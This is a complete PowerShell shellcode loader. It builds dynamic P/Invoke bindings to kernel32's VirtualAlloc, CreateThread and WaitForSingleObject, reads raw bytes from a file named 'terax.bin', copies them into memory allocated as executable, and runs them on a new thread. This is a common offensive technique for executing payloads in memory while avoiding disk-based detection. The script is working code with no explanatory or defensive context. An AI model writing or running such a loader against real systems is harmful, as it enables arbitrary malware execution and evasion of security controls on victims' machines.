$Domain = [AppDomain]::CurrentDomain
$DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Module', $False)
$TypeBuilder = $ModuleBuilder.DefineType('Win32', 'Public, Class')

$PInvokeMethod = $TypeBuilder.DefineMethod('VirtualAlloc', 
    [System.Reflection.MethodAttributes] 'Public, Static',
    [IntPtr],
    [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
$DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$FieldArray = [System.Reflection.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
$FieldValueArray = [Object[]] @($True)
$CustomBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'), $FieldArray, $FieldValueArray)
$PInvokeMethod.SetCustomAttribute($CustomBuilder)

$PInvokeMethod = $TypeBuilder.DefineMethod('CreateThread',
    [System.Reflection.MethodAttributes] 'Public, Static',
    [IntPtr],
    [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
$DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$FieldArray = [System.Reflection.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
$FieldValueArray = [Object[]] @($True)
$CustomBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'), $FieldArray, $FieldValueArray)
$PInvokeMethod.SetCustomAttribute($CustomBuilder)

$PInvokeMethod = $TypeBuilder.DefineMethod('WaitForSingleObject',
    [System.Reflection.MethodAttributes] 'Public, Static',
    [UInt32],
    [Type[]] @([IntPtr], [UInt32]))
$DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$FieldArray = [System.Reflection.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
$FieldValueArray = [Object[]] @($True)
$CustomBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'), $FieldArray, $FieldValueArray)
$PInvokeMethod.SetCustomAttribute($CustomBuilder)

$Win32 = $TypeBuilder.CreateType()

$shellcode = [System.IO.File]::ReadAllBytes("terax.bin");
$size = $shellcode.Length;

[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);
	
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size);

$handle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0);

[Win32]::WaitForSingleObject($handle, [uint32]"0xFFFFFFFF");